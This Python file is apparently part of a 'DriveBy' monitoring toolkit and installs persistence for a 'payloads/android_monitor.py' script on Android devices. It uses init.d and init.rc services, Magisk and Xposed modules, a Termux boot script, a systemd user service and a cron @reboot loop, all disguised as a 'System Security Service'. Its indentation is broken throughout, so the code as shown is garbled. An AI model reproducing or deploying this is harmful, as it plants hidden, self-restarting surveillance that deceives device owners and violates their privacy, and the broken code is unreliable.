#!/usr/bin/env python3
"""
Android Persistence Module
Ensures DriveBy monitoring processes restart after shutdown/restart
"""

import os
import sys
import subprocess
import tempfile
import shutil
import json
from pathlib import Path

class AndroidPersistence:
    def __init__(self):
        self.script_path = Path(__file__).parent.parent / "payloads" / "android_monitor.py"
        self.package_name = "com.android.system.security"

    def create_init_d_persistence(self):
        """Create init.d script for rooted devices"""
        try:
            init_script = f'''#!/system/bin/sh
            # Android System Security Service

            case "$1" in
            start)
            /system/bin/python {self.script_path} &
            echo $! > /data/local/tmp/security_service.pid
            ;;
            stop)
            if [ -f /data/local/tmp/security_service.pid ]; then
            kill `cat /data/local/tmp/security_service.pid`
            rm /data/local/tmp/security_service.pid
            fi
            ;;
            restart)
            $0 stop
            sleep 2
            $0 start
            ;;
            *)
            echo "Usage: $0 {{start|stop|restart}}"
            exit 1
            ;;
            esac

            exit 0
            '''

            init_file = "/system/etc/init.d/99security"

            # Write init script
            with open(init_file, 'w') as f:
                f.write(init_script)

                # Make executable
                os.chmod(init_file, 0o755)

                # Start the service
                subprocess.run([init_file, 'start'], check=True)

                print(" Init.d persistence created")
                return True

        except Exception as e:
                print(f" Init.d persistence failed: {e}")
                return False

def create_app_process_persistence(self):
    """Create app_process persistence"""
    try:
        # Create wrapper script
        wrapper_content = f'''#!/system/bin/sh
        export CLASSPATH=/system/framework/am.jar
        exec app_process /system/bin com.android.commands.am.Am start-service \\
        -n {self.package_name}/.SecurityService
        '''

        wrapper_path = "/system/bin/security_service"

        with open(wrapper_path, 'w') as f:
            f.write(wrapper_content)

            os.chmod(wrapper_path, 0o755)

            print(" App process persistence created")
            return True

    except Exception as e:
            print(f" App process persistence failed: {e}")
            return False

def create_property_trigger_persistence(self):
    """Create property trigger persistence"""
    try:
        # Add to init.rc or create custom .rc file
        rc_content = f'''
        service security_service /system/bin/python {self.script_path}
class main
user system
group system
oneshot
disabled

on property:sys.boot_completed=1
start security_service

on property:dev.bootcomplete=1
start security_service
'''

rc_file = "/system/etc/init/security_service.rc"

with open(rc_file, 'w') as f:
    f.write(rc_content)

    print(" Property trigger persistence created")
    return True

except Exception as e:
    print(f" Property trigger persistence failed: {e}")
    return False

def create_magisk_module_persistence(self):
    """Create Magisk module for persistence"""
    try:
        # Create Magisk module structure
        module_dir = "/data/adb/modules/system_security"
        os.makedirs(module_dir, exist_ok=True)

        # Create module.prop
        module_prop = f'''id=system_security
        name=System Security Service
        version=v1.0
        versionCode=1
        author=System
        description=System Security Update Service
        '''

        with open(f"{module_dir}/module.prop", 'w') as f:
            f.write(module_prop)

            # Create service.sh
            service_script = f'''#!/system/bin/sh
            # Start security service
            nohup /system/bin/python {self.script_path} > /dev/null 2>&1 &
            '''

            with open(f"{module_dir}/service.sh", 'w') as f:
                f.write(service_script)

                os.chmod(f"{module_dir}/service.sh", 0o755)

                # Create post-fs-data.sh
                post_fs_script = f'''#!/system/bin/sh
                # Post-fs-data script
                mkdir -p /data/local/tmp/security
                '''

                with open(f"{module_dir}/post-fs-data.sh", 'w') as f:
                    f.write(post_fs_script)

                    os.chmod(f"{module_dir}/post-fs-data.sh", 0o755)

                    print(" Magisk module persistence created")
                    return True

    except Exception as e:
                    print(f" Magisk module persistence failed: {e}")
                    return False

def create_xposed_module_persistence(self):
    """Create Xposed module for persistence"""
    try:
        # Create Xposed module structure
        module_dir = "/data/data/de.robv.android.xposed.installer/modules/system_security"
        os.makedirs(module_dir, exist_ok=True)

        # Create module manifest
        manifest = {
        "package": self.package_name,
        "name": "System Security Service",
        "version": "1.0",
        "description": "System Security Update Service",
        "main_class": "com.android.system.security.SecurityModule"
        }

        with open(f"{module_dir}/module.json", 'w') as f:
            json.dump(manifest, f, indent=2)

            print(" Xposed module persistence created")
            return True

    except Exception as e:
            print(f" Xposed module persistence failed: {e}")
            return False

def create_systemd_user_service(self):
    """Create systemd user service for Android with systemd"""
    try:
        # Some Android distributions use systemd
        service_content = f'''[Unit]
        Description=System Security Service
        After=graphical-session.target

        [Service]
        Type=simple
        ExecStart=/usr/bin/python3 {self.script_path}
        Restart=always
        RestartSec=30

        [Install]
        WantedBy=default.target
        '''

        # User systemd directory
        systemd_dir = Path.home() / ".config" / "systemd" / "user"
        systemd_dir.mkdir(parents=True, exist_ok=True)

        service_file = systemd_dir / "system-security.service"

        with open(service_file, 'w') as f:
            f.write(service_content)

            # Enable and start service
            subprocess.run(['systemctl', '--user', 'enable', 'system-security.service'], check=True)
            subprocess.run(['systemctl', '--user', 'start', 'system-security.service'], check=True)

            print(" Systemd user service persistence created")
            return True

    except Exception as e:
            print(f" Systemd user service persistence failed: {e}")
            return False

def create_termux_boot_persistence(self):
    """Create Termux boot persistence"""
    try:
        # Termux boot directory
        boot_dir = Path.home() / ".termux" / "boot"
        boot_dir.mkdir(parents=True, exist_ok=True)

        # Create boot script
        boot_script = f'''#!/data/data/com.termux/files/usr/bin/bash
        cd "{Path(__file__).parent.parent}"
        nohup python {self.script_path} > /dev/null 2>&1 &
        '''

        boot_file = boot_dir / "security_service"

        with open(boot_file, 'w') as f:
            f.write(boot_script)

            os.chmod(boot_file, 0o755)

            print(" Termux boot persistence created")
            return True

    except Exception as e:
            print(f" Termux boot persistence failed: {e}")
            return False

def create_cron_persistence(self):
    """Create cron persistence for Android with cron support"""
    try:
        # Create wrapper script
        wrapper_script = self.create_cron_wrapper()

        # Add to crontab
        cron_entry = f"@reboot {wrapper_script}\n"

        # Get current crontab
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
        except:
            current_cron = ""

            # Add our entry if not already present
            if wrapper_script not in current_cron:
                new_cron = current_cron + cron_entry

                # Write new crontab
                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                process.communicate(input=new_cron)

                if process.returncode == 0:
                    print(" Cron persistence created")
                    return True
                else:
                    print(" Cron persistence already exists")
                    return True

        except Exception as e:
                    print(f" Cron persistence failed: {e}")
                    return False

def create_cron_wrapper(self):
    """Create cron wrapper script"""
    wrapper_content = f'''#!/system/bin/sh
    cd "{Path(__file__).parent.parent}"

    while true; do
    python {self.script_path} > /dev/null 2>&1
    sleep 30
    done
    '''

    wrapper_path = "/data/local/tmp/security_wrapper.sh"
    with open(wrapper_path, 'w') as f:
        f.write(wrapper_content)

        os.chmod(wrapper_path, 0o755)
        return wrapper_path

def install_all_persistence(self):
    """Install all persistence mechanisms"""
    results = []

    print(" Installing Android persistence mechanisms...")

    # Check if device is rooted
    is_rooted = self.check_root_access()

    if is_rooted:
        # Try init.d persistence (rooted)
        results.append(self.create_init_d_persistence())

        # Try property trigger persistence (rooted)
        results.append(self.create_property_trigger_persistence())

        # Try Magisk module (if Magisk is present)
        if os.path.exists("/data/adb/magisk"):
            results.append(self.create_magisk_module_persistence())

            # Try Xposed module (if Xposed is present)
            if os.path.exists("/data/data/de.robv.android.xposed.installer"):
                results.append(self.create_xposed_module_persistence())

                # Try Termux boot (if Termux is present)
                if os.path.exists("/data/data/com.termux"):
                    results.append(self.create_termux_boot_persistence())

                    # Try systemd user service (some Android distros)
                    if shutil.which('systemctl'):
                        results.append(self.create_systemd_user_service())

                        # Try cron persistence (if available)
                        if shutil.which('crontab'):
                            results.append(self.create_cron_persistence())

                            successful = sum(results)
                            print(f" Android persistence: {successful}/{len(results)} methods installed")

                            return successful > 0

def check_root_access(self):
    """Check if device has root access"""
    try:
        # Try to access root-only locations
        root_indicators = [
        "/system/xbin/su",
        "/system/bin/su",
        "/sbin/su",
        "/data/adb/magisk"
        ]

        for indicator in root_indicators:
            if os.path.exists(indicator):
                return True

                # Try to run su command
                result = subprocess.run(['su', '-c', 'id'], capture_output=True, timeout=5)
                return result.returncode == 0

    except:
                return False

def remove_persistence(self):
    """Remove all persistence mechanisms"""
    try:
        # Remove init.d script
        try:
            subprocess.run(["/system/etc/init.d/99security", "stop"], capture_output=True)
            os.remove("/system/etc/init.d/99security")
        except:
            pass

            # Remove app process wrapper
            try:
                os.remove("/system/bin/security_service")
            except:
                pass

                # Remove property trigger
                try:
                    os.remove("/system/etc/init/security_service.rc")
                except:
                    pass

                    # Remove Magisk module
                    try:
                        shutil.rmtree("/data/adb/modules/system_security")
                    except:
                        pass

                        # Remove Xposed module
                        try:
                            shutil.rmtree("/data/data/de.robv.android.xposed.installer/modules/system_security")
                        except:
                            pass

                            # Remove Termux boot script
                            try:
                                boot_file = Path.home() / ".termux" / "boot" / "security_service"
                                if boot_file.exists():
                                    boot_file.unlink()
                            except:
                                    pass

                                    # Remove systemd user service
                                    try:
                                        subprocess.run(['systemctl', '--user', 'stop', 'system-security.service'], capture_output=True)
                                        subprocess.run(['systemctl', '--user', 'disable', 'system-security.service'], capture_output=True)
                                        service_file = Path.home() / ".config" / "systemd" / "user" / "system-security.service"
                                        if service_file.exists():
                                            service_file.unlink()
                                    except:
                                            pass

                                            # Remove cron entry
                                            try:
                                                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                                                if result.returncode == 0:
                                                    lines = result.stdout.split('\n')
                                                    filtered_lines = [line for line in lines if 'security_wrapper' not in line]
                                                    new_cron = '\n'.join(filtered_lines)

                                                    process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                                                    process.communicate(input=new_cron)
                                            except:
                                                    pass

                                                    # Remove wrapper script
                                                    try:
                                                        os.remove("/data/local/tmp/security_wrapper.sh")
                                                    except:
                                                        pass

                                                        print(" Android persistence removed")
                                                        return True

                                                    except Exception as e:
                                                        print(f" Error removing persistence: {e}")
                                                        return False

                                                        if __name__ == "__main__":
                                                            persistence = AndroidPersistence()

                                                            if len(sys.argv) > 1 and sys.argv[1] == "remove":
                                                                persistence.remove_persistence()
                                                            else:
                                                                persistence.install_all_persistence()
